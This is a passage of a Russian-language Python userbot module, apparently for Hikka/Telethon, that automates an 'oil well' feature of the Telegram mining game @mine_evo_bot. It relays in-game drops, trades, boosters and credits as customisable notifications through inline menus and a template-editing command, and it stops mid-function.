        if status == True:
            await call.edit(
                text='<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Включена ',
                reply_markup=[
                        [
                            {
                                "text": "🛢 Запустить / остановить скважину",
                                "callback": self.status_drill,
                            },
                        ],
                        [
                            {
                                "text": "⚙️ Настройки скважины",
                                "callback": self.cfg_drill,
                            },
                        ],
                        [
                            {
                                'text':'💰 Поддержать автора',
                                'callback': self.donate_author,
                            }
                        ],
                        [
                            {
                                'text':'🔻 Закрыть меню',
                                'action': 'close'
                            }
                        ],
                    ]
            )
            return
        if status == False:
            await call.edit(
                text='<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Отключена ',
                reply_markup=[
                        [
                            {
                                "text": "🛢 Запустить / остановить скважину",
                                "callback": self.status_drill,
                            },
                        ],
                        [
                            {
                                "text": "⚙️ Настройки скважины",
                                "callback": self.cfg_drill,
                            },
                        ],
                        [
                            {
                                'text':'💰 Поддержать автора',
                                'callback': self.donate_author,
                            }
                        ],
                        [
                            {
                                'text':'🔻 Закрыть меню',
                                'action': 'close'
                            }
                        ],
                    ]
            )

    async def status_drill(self, call: InlineCall):
        self.config['module'] = not self.config['module']
        status = self.config['module']
        if status == True:
            await self.client.send_message(5522271758, 'Качать')
            await call.edit(
                text='<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Включена  ',
                reply_markup=[
                        [
                            {
                                "text": "🛢 Запустить / остановить скважину",
                                "callback": self.status_drill,
                            },
                        ],
                        [
                            {
                                "text": "⚙️ Настройки скважины",
                                "callback": self.cfg_drill,
                            },
                        ],
                        [
                            {
                                'text':'💰 Поддержать автора',
                                'callback': self.donate_author,
                            }
                        ],
                        [
                            {
                                'text':'🔻 Закрыть меню',
                                'action': 'close'
                            }
                        ],
                    ]
            )
            return
        if status == False:
            await call.edit(
                text='<b>Меню вашей нефтяной скважины:</b>\n\n<b>Статус:</b> Отключена ',
                reply_markup=[
                        [
                            {
                                "text": "🛢 Запустить / остановить скважину",
                                "callback": self.status_drill,
                            },
                        ],
                        [
                            {
                                "text": "⚙️ Настройки скважины",
                                "callback": self.cfg_drill,
                            },
                        ],
                        [
                            {
                                'text':'💰 Поддержать автора',
                                'callback': self.donate_author,
                            }
                        ],
                        [
                            {
                                'text':'🔻 Закрыть меню',
                                'action': 'close'
                            }
                        ],
                    ]
            )
            return
        
        
    async def cfg_drill(self, call: InlineCall):
        a1 = self.config['warning']
        a2 = self.config['delay_fuel']
        a3 = self.config['delay_ex_fuel']
        if a1 == True:
            a1 = 'Включены'
        elif a1 == False:
            a1 = 'Отключены'
        await call.edit(
            text=f'<b>Меню вашей нефтяной скважины:</b> \n\n<b>Информация:\nУведомления: </b>{a1}\n<b>Переодичность копания: </b>{a2}\n<b>Переодичность добычи:</b> {a3}',
            reply_markup=[
                    [
                        {
                            "text": "🚨 Уведомления об заполненом хранилище",
                            "callback": self.warning_drill,
                        }
                    ],
                    [
                        {
                            "text": "⏲ Переодичность копания",
                            "callback": self.delay_drill,
                        },
                    ],
                    [
                        {
                            "text": "⏲ Переодичность добычи",
                            "callback": self.delay_ex_drill,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.home_drill,
                        },
                    ],
                    
                ]
        )

    async def warning_drill(self, call: InlineCall):
        self.config['warning'] = not self.config['warning']
        a1 = self.config['warning']
        a2 = self.config['delay_fuel']
        a3 = self.config['delay_ex_fuel']
        if a1 == True:
            a1 = 'Включены'
        elif a1 == False:
            a1 = 'Отключены'
        await call.edit(
            text=f'<b>Меню вашей нефтяной скважины:</b> \n\n<b>Информация:\nУведомления: </b>{a1}\n<b>Переодичность копания: </b>{a2}\n<b>Переодичность добычи:</b> {a3}',
            reply_markup=[
                    [
                        {
                            "text": "🚨 Уведомления об заполненом хранилище",
                            "callback": self.warning_drill,
                        }
                    ],
                    [
                        {
                            "text": "⏲ Переодичность копания",
                            "callback": self.delay_drill,
                        },
                    ],
                    [
                        {
                            "text": "⏲ Переодичность добычи",
                            "callback": self.delay_ex_drill,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.home_drill,
                        },
                    ],
                    
                ]
        )
        

    async def delay_drill(self, call: InlineCall):
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                            "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay_ex_drill(self, call: InlineCall):
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность добычи - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )
    
    async def delay1(self, call: InlineCall):
        self.config['delay_fuel'] = 60
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                            "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay2(self, call: InlineCall):
        self.config['delay_fuel'] = 120
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                            "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay5(self, call: InlineCall):
        self.config['delay_fuel'] = 300
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                            "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )
        
    async def delay10(self, call: InlineCall):
        self.config['delay_fuel'] = 600
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                            "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay12(self, call: InlineCall):
        self.config['delay_fuel'] = 720
        aaa = self.config['delay_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько минут будет попытка качать, если нефти нет?\n\n<b>Текущее: </b>{aaa} минут',
            reply_markup=[
                    [
                        {
                            "text": "1 час",
                            "callback": self.delay1,
                        },
                        {
                            "text": "2 часа",
                             "callback": self.delay2,
                        },
                    ],
                    [
                        {
                            "text": "5 часов",
                            "callback": self.delay5,
                        },
                        {
                            "text": "10 часов",
                            "callback": self.delay10,
                        },
                    ],
                    [
                        {
                            "text": "12 часов",
                            "callback": self.delay12,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )
        
    async def delay_ex2(self, call: InlineCall):
        self.config['delay_ex_fuel'] = 2
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )
        
    async def delay_ex3(self, call: InlineCall):
        self.config['delay_ex_fuel'] = 3
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay_ex5(self, call: InlineCall):
        self.config['delay_ex_fuel'] = 5
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay_ex10(self, call: InlineCall):
        self.config['delay_ex_fuel'] = 10
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )

    async def delay_ex15(self, call: InlineCall):
        self.config['delay_ex_fuel'] = 15
        aaa = self.config['delay_ex_fuel']
        await call.edit(
            text=f'Переодичность копания - раз в сколько секунд скважина будет качать, если нефть есть?\n\n<b>Текущее: </b>{aaa} секунд',
            reply_markup=[
                    [
                        {
                            "text": "2 сек",
                            "callback": self.delay_ex2,
                        },
                        {
                            "text": "3 сек",
                            "callback": self.delay_ex3,
                        },
                    ],
                    [
                        {
                            "text": "5 сек",
                            "callback": self.delay_ex5,
                        },
                        {
                            "text": "10 секунд",
                            "callback": self.delay_ex10,
                        },
                    ],
                    [
                        {
                            "text": "15 секунд",
                            "callback": self.delay_ex15,
                        },
                    ],
                    [
                        {
                            "text": "🏠 Вернуться обратно",
                            "callback": self.cfg_drill,
                        },
                    ],
                    
                ]
        )
        
    async def donate_author(self, call: InlineCall):
        await call.answer('❤️ Спасибо')
        await self.client.send_message('@mine_evo_bot', 'Дать # к 1')
        
    @loader.command()
    async def strs(self, m: Message):
        '''Строки'''
        await utils.answer(m, f"<b>Текущие строки</b>:\n\n<i>Кт</i>:\n{self.get('kts')}\n<i>Ркт</i>:\n{self.get('rkts')}\n<i>К</i>:\n{self.get('ks')}\n<i>Рк</i>:\n{self.get('rks')}\n<i>Миф</i>:\n{self.get('mifs')}\n<i>Псэ</i>:\n{self.get('pss')}\n<i>Ссп</i>:\n{self.get('sss')}\n<i>Кр</i>:\n{self.get('krs')}\n<i>Зв</i>:\n{self.get('zvs')}\n\n<i>Трейды</i>:\n{self.get('tradett')}\n<i>Кредиты</i>:\n{self.get('creditss')}")


    @loader.watcher()
    async def watcher(self, message):
        chid = int(self.get("chid"))
        if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "Найден" in message.raw_text or hasattr(message, 'from_id') and message.from_id == 7168860714 and message.chat_id == 7168860714 and "Найден" in message.raw_text:
            if "✉" in message.raw_text and "Конверт" in message.raw_text:
                if self.get('kt'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('kts').format(colvo=colvo))

            if "🧧" in message.raw_text and "Редкий Конверт" in message.raw_text:
                if self.get('rkt'):     
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('rkts').format(colvo=colvo))
            
            if "📦" in message.raw_text and "Кейс" in message.raw_text:
                if self.get('k'):              
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('ks').format(colvo=colvo))
            
            if "🗳" in message.raw_text and "Редкий Кейс" in message.raw_text:
                if self.get('rk'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('rks').format(colvo=colvo))

            if "🕋" in message.raw_text and "Мифический Кейс" in message.raw_text:
                if self.get('mif'):         
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('mifs').format(colvo=colvo))
            
            if "Портфель" in message.raw_text:
                if self.get('ps'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('pss').format(colvo=colvo))

            if "Сумка" in message.raw_text:    
                if self.get('ss'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('sss').format(colvo=colvo))

            if "💎" in message.raw_text and "Кристальный Кейс" in message.raw_text:
               if self.get('kr'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('krs').format(colvo=colvo))

            if "🎲" in message.raw_text and "Дайс Кейс" in message.raw_text:
                if self.get('dk'):
                    colpt = r"\d+"
                    search = re.search(colpt, message.raw_text)
                    colvo = search[0]
                    await self.inline.bot.send_message(chid, self.get('dks').format(colvo=colvo))  

        if hasattr(message, 'from_id') and message.from_id == 7168860714 and message.chat_id == 7168860714 and "💫" in message.raw_text or hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "💫" in message.raw_text:
            if self.get('zv'):
                colvo = 1
    
                await self.inline.bot.send_message(chid, self.get('zvs').format(colvo=colvo))
        
        if self.get('tradec'):                
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "передал(а) тебе" in message.raw_text:
                nick = "<code>(.*?)</code>"
                kolvo = "тебе  (.*?) шт."

                nickname = re.search(nick, message.text, re.DOTALL)
                kol = re.search(kolvo, message.raw_text, re.DOTALL)
                
                nick = nickname.group(1)
                cases = kol.group(1)

                await self.inline.bot.send_message(chid, self.get('tradett').format(nick=nick, cases=cases))

        if self.get('tradei'):
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "Получен предмет" in message.raw_text:
                nick = "Игрок  (.*?) передал"
                item = 'тебе :\n(.+)'

                nick = re.search(nick, message.raw_text, re.DOTALL)
                item = re.search(item, message.text, re.DOTALL)

                nick = nick.group(1)
                item = item.group(1)

                await self.inline.bot.send_message(chid, self.get('tradeis').format(nick=nick, item=item))

        
        if self.get('bosses'):
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "побежден игроком" in message.raw_text:
                await self.inline.bot.send_message(chid, message.text)
        
        if self.get('boosters'):
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Руда ×2.0!" in message.raw_text:
                    await self.inline.bot.send_message(chid, self.get('boostersr2'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Деньги ×2.0!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersd2'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Деньги ×1.5!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersd1.5'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Руда ×1.5!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersr1.5'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Деньги ×2.5!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersd2.5'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Руда ×2.5!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersr2.5'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Деньги ×3.0!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersr3'))
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "ты нашел(ла)" in message.raw_text and "бустер: Руда ×3.0!" in message.raw_text:
                await self.inline.bot.send_message(chid, self.get('boostersd3'))
                
        if self.get('credits'):
            if hasattr(message, 'from_id') and message.from_id == 5522271758 and message.chat_id == 5522271758 and "💳" in message.raw_text and 'перечислил(а) тебе ' in message.raw_text:
                nickc = "<code>(.*?)</code>"
                kolvoc = "тебе (.*?) эво"

                kolvocredits = re.search(kolvoc, message.text, re.DOTALL)
                nickcredits = re.search(nickc, message.text, re.DOTALL)

                cred = kolvocredits.group(1)
                nick = nickcredits.group(1)

                await self.inline.bot.send_message(chid, self.get('creditss').format(cred=cred, nick=nick))
            
            
    @loader.command()
    async def setstr(self, message: Message):
        '''- Изменить строку\n[Тип строки] [Новая строка\Ничего]\nТип строки и как её изменять можно посмотреть в .sethelp'''
        args = utils.get_args_raw(message.text)
        cmd = f'{utils.escape_html(self.get_prefix())}{inspect.currentframe().f_code.co_name}'
        if not args:
            await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\nУкажите тип строки")
            return
        if args:
            cmd = f'{utils.escape_html(self.get_prefix())}{inspect.currentframe().f_code.co_name} {utils.get_args_raw(message)}'
            type = args.split(' ', maxsplit=1)[0].lower()
            stri = None
            if len(args.split(' ', maxsplit=1)) > 1:
                stri = args.split(' ', maxsplit=1)[1]

            if type == "кт":
                if stri == None:
                    self.set('kts', "✉️ <b>Конверт <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('kts')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('kts', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка ✉️ <i>Конверт</i> на</b>:\n{self.get('kts')}")
            
            elif type == "ркт":
                if stri == None:
                    self.set('rkts', "🧧 <b>Редкий Конверт <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('rkts')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('rkts', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 🧧 <i>Редкий Конверт</i> на</b>:\n{self.get('rkts')}")

            elif type == "к":
                if stri == None:
                    self.set('ks', "📦 <b>Кейс <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('ks')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('ks', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 📦 <i>Кейс</i> на</b>:\n{self.get('ks')}")

            elif type == "рк":
                if stri == None:
                    self.set('rks', "🗳 <b>Редкий Кейс <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('rks')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('rks', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 🗳 <i>Редкпй Кейс</i> на</b>:\n{self.get('rks')}")
            
            elif type == "миф":
                if stri == None:
                    self.set('mifs', "<i>Грац!</i>\n🕋 <b>Мифический Кейс <code>+{colvo}</code>!</b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('mifs')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('mifs', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 🕋 <i>Мифический Кейс</i> на</b>:\n{self.get('mifs')}")

            elif type == "псэ":
                if stri == None:
                    self.set('pss', "<i>Luck is on your side!</i>\n💼 <b>Портфель с Эскизами <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('pss')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('pss', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 💼 <i>Портфель с Эскизами</i> на</b>:\n{self.get('pss')}")

            elif type == "ссп":
                if stri == None:
                    self.set('sss', "<i>A pleasant surprise!</i>\n👜 <b>Сумка с предметами <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('sss')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('sss', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 👜 <i>Сумка с Предметами</i> на</b>:\n{self.get('sss')}")

            elif type == "кр":
                if stri == None:
                    self.set('krs', "<i>Congratulations!</i>\n💎 <b>Кристальный кейс <code>+{colvo}</code>!</b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('krs')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('krs', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 💎 <i>Кристальный Кейс</i> на</b>:\n{self.get('krs')}")

            elif type == "дк":
                if stri == None:
                    self.set('dks', "<i>Good luck!</i>\n🎲 <b>Кейс кубик <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('dks')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else:
                    self.set('dks', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 🎲 <i>Дайс Кейс</i> на</b>:\n{self.get('dks')}")
            elif type == 'зв':
                if stri == None:
                    self.set('zvs', "<i>WOW, you are lucky!</i>\n🌌 <b>Звездный Кейс <code>+{colvo}</code></b>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('zvs')}")
                    return
                if "{colvo}" not in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строк 'кейсы'</b>")
                    return
                else: 
                    self.set('zvs', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 🌌 <i>Звёздный Кейс</i> на</b>:\n{self.get('zvs')}")

            elif type == "обмен":
                if stri == None:
                    self.set('tradett', "<b><code>{nick}</code> дал тебе</b>:\n<i>{cases}</i>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('tradett')}")
                    return
                if not "{cases}" in stri or not "{nick}" in stri:
                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строки 'обмен'</b>")
                    return
                if "{cases}" in stri and "{nick}" in stri:
                    self.set('tradett', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка <i>Обмен</i> на</b>:\n{self.get('tradett')}")

            elif type == "бд15":
                if stri == None:
                    self.set('boostersd1.5', "⚡️ <b>Буст денег 1.5 </b><i>+1</i>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('boostersd1.5')}")
                    return
                else: 
                    self.set('boostersd1.5', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка ⚡️ <i>Бустер денег 1.5</i> на</b>:\n{self.get('boostersd1.5')}")

            elif type == "бр15":
                if stri == None:
                    self.set('boostersr1.5', "⚡️ <b>Буст руды 1.5 </b><i>+1</i>")
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Установлено значение по умолчанию</b>:\n{self.get('creditss')}")
                    return
                if not "{nick}" in stri or not "{cred}" in stri:
